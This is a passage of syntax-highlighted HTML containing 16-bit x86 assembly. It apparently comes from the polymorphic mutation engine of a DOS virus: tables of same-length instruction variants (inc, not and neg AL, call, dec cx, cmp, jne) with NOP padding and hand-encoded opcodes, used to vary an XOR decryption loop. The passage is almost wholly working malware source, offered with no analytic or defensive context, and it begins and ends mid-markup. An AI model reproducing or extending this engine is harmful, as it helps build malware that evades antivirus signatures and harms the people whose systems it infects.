</span><span class="sc5">_mutation10ter</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">baise_les4</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">baise_les4</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc1">;10quart/  inc AL in 10 bytes (without CX, SI, DI, DL, AL)</span><span class="sc0">

</span><span class="sc5">_mutation10quart</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">baise_les</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">baise_les</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc1">;10quinte/  not AL in 10 bytes (without CX, SI, DI, DL, AL)</span><span class="sc0">

</span><span class="sc5">_mutation10quinte</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">baise_les2</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">baise_les2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc1">;10sixte/  neg AL in 10 bytes (without CX, SI, DI, DL, AL)</span><span class="sc0">

</span><span class="sc5">_mutation10sixte</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">baise_les3</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">baise_les3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc1">;11/ CALL in 12 bytes (without CX, SI, DI, DL, AL)</span><span class="sc0">

</span><span class="sc5">_mutation11</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">     </span><span class="sc1">;call baise_flag_cryptage</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc6">stc</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mutation11</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">           </span><span class="sc1">;jmp baise_flag_cryptage</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc6">clc</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc0">            </span><span class="sc1">;mov bx, bp</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mutation11</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Ch</span><span class="sc0">       </span><span class="sc1">;add bx, 12</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">53h</span><span class="sc0">                  </span><span class="sc1">;push bx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BBh</span><span class="sc0">           </span><span class="sc1">;jmp baise_flag_cryptage</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">51h</span><span class="sc0">                  </span><span class="sc1">;push cx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mutation11</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">53h</span><span class="sc0">                  </span><span class="sc1">;push bx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">            </span><span class="sc1">;mov cl, 2</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BDh</span><span class="sc0">           </span><span class="sc1">;loop baise_flag_cryptage</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">59h</span><span class="sc0">                  </span><span class="sc1">;pop cx</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mutation11</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">53h</span><span class="sc0">                  </span><span class="sc1">;push bx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBh</span><span class="sc0">            </span><span class="sc1">;xor bl, bl</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BEh</span><span class="sc0">            </span><span class="sc1">;jbe baise_flag_cryptage</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">mutation11</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">                  </span><span class="sc1">;inc bx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc0">            </span><span class="sc1">;add bx, bp</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">43h</span><span class="sc0">                  </span><span class="sc1">;inc bx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">53h</span><span class="sc0">                  </span><span class="sc1">;push bx</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">32h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBh</span><span class="sc0">            </span><span class="sc1">;xor bl, bl</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BBh</span><span class="sc0">            </span><span class="sc1">;je baise_flag_cryptage</span><span class="sc0">

</span><span class="sc1">;12/ DEC CX in 5 bytes (without CX, SI, DI, DL, AL)</span><span class="sc0">

</span><span class="sc5">_mutation12</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">83h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc1">;13/ CMP CX, 0 in 6 bytes</span><span class="sc0">

</span><span class="sc5">_mutation13</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">suite_or</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc0">
</span><span class="sc5">suite_or</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc1">;14/ JNE XOR_LOOP in 7 bytes</span><span class="sc0">

</span><span class="sc5">_mutation14</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D2h</span><span class="sc0">            </span><span class="sc1">;jne xor_loop</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">        </span><span class="sc1">;3 nop</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">75h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D4h</span><span class="sc0">            </span><span class="sc1">;jne xor_loop</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">                  </span><span class="sc1">;nop</span><span class="sc0">
</span><span class="sc6">clc</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">             </span><span class="sc1">;2 nop</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">74h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03</span><span class="sc0">              </span><span class="sc1">;je suite_zob</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D3h</span><span class="sc0">           </span><span class="sc1">;jmp xor_loop</span><span class="sc0">
</span><span class="sc6">stc</span><span class="sc0">
</span><span class="sc1">;suite_zob:</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">77h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D7h</span><span class="sc0">            </span><span class="sc1">;ja xor_loop</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">        </span><span class="sc1">;3 nop</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">             </span><span class="sc1">;2 nop</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">76h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">             </span><span class="sc1">;jna suite_zobi ;2</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D5h</span><span class="sc0">           </span><span class="sc1">;jmp xor_loop</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">        </span><span class="sc1">;3 nop</span><span class="sc0">
</span><span class="sc1">;suite_zobi:</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">9Ch</span><span class="sc0">                  </span><span class="sc1">;pushf</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5Bh</span><span class="sc0">                  </span><span class="sc1">;pop bx</span><span class="sc0">
